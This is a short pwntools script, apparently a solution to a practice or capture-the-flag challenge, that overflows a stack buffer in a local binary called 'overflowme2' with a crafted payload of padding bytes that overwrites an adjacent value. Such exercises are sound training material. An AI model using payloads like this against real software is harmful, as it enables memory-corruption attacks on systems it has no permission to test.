from pwn import *

context.log_level = "debug"

p = process(b"./overflowme2")

payload = b"A" * (0x50 - 0x4)
payload += b"Y" * 4
p.recvuntil(b" :\n")
p.sendline(payload)
p.recvall()
